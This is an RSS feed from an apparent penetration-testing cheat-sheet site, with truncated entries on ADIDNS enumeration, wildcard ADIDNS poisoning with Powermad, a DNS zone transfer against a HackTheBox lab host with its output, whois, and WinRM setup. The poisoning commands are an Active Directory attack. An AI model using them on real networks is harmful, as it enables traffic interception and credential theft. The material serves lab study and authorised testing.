channel.title: Domain on TLDRBins
channel.description: Recent content in Domain on TLDRBins

item.title: ADIDNS
item.description: Basic Windows 1. Import Module . .\Powermad.ps1 2. Enum # Get ADIDNS Zone Get-ADIDNSZone # Get ADIDNS Permissions Get-ADIDNSPermission # Remove a Node Remove-ADIDNSNode -Node * Abuse #1: ADIDNS Poisoning Windows 1. Import Module . .\Powermad.ps1 2. Create a New Node $dnsRecord = New-DNSRecordArray -Type A -Data <LOCAL_IP> New-ADIDNSNode -Node * -Tombstone -DNSRecord $dnsRecord -Verbose 3. Check Resolve-DnsName DoesNotExist

item.title: DNS Enum
item.description: Linux Windows Zone Transfer dig +noall +answer <DOMAIN> axfr @<TARGET> $ dig +noall +answer snoopy.htb axfr @10.10.11.212 snoopy.htb. 86400 IN SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400 snoopy.htb. 86400 IN NS ns1.snoopy.htb. snoopy.htb. 86400 IN NS ns2.snoopy.htb. mattermost.snoopy.htb. 86400 IN A 172.18.0.3 mm.snoopy.htb. 86400 IN A 127.0.0.1 ns1.snoopy.htb. 86400 IN A 10.0.50.10 ns2.snoopy.htb. 86400 IN A 10.0.51.10 postgres.snoopy.htb. 86400 IN A 172.18.0.2 provisions.snoopy.htb. 86400 IN A 172.18.0.4 www.snoopy.htb. 86400 IN A 127.

item.title: whois
item.description: WHOIS # General whois <DOMAIN> # With specific server whois -h <WHOIS_SERVER> -p 43 <DOMAIN>

item.title: Winrm from Windows VM
item.description: Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client 2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to 'Control Panel\Network and Internet\Network and Sharing Center' | | 2. Click 'Local Area Connection' | | 3. Go to 'Properties' -> 'Internet Protocol Version 4 (TCP/IPv4)' -> 'Properties' | | 4. Under 'General', check 'Obtain an IP address automatically' | | 5. Check 'Use the following DNS address' -> 'Prefer DNS Server' -> <DC_IP> | +-----------------------------------------------------------------------------------+ 3.
